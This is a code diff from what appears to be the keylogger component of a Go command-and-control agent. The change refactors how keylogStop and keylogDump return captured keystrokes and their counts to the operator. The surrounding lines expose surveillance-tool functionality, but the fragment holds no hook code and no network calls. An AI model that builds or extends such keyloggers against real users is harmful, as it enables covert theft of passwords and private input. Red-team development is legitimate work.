@@ -159,11 +159,7 @@ func keylogStop() structs.CommandResult {
 	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
 		duration.Round(time.Second), keyCount, output)
 
-	return structs.CommandResult{
-		Output:    result,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(result)
 }
 
 func keylogDump() structs.CommandResult {
@@ -184,11 +180,7 @@ func keylogDump() structs.CommandResult {
 	result := fmt.Sprintf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
 		duration.Round(time.Second), kl.keyCount, output)
 
-	return structs.CommandResult{
-		Output:    result,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(result)
 }
 
 // keylogLoop runs the keyboard hook message pump
